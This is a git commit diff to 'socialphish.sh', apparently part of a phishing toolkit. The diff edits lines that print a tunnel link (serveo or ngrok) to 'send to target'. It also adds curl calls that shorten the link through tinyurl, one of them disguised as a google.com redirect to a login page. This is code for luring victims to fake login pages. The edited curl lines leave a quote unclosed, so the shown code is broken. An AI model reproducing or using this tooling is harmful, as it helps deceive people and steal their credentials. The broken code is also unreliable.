16b6e1bf9295d5bf32f43d5f06c07a4328f0d10d
dineshyadav23 <63169709+dineshyadav23@users.noreply.github.com>
2021-06-21 03:30:55 +0530

    Update socialphish.sh

--- socialphish.sh
+++ socialphish.sh
@@ -394,6 +394,7 @@ sleep 10 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.google.com/redirect?v=login.html | head -n1)
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
@@ -478,7 +479,7 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
-send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.google.com/redirect?v=login.html -fqU" | head -n1)
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.google.com/redirect?v=login.html | head -n1)
 #send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
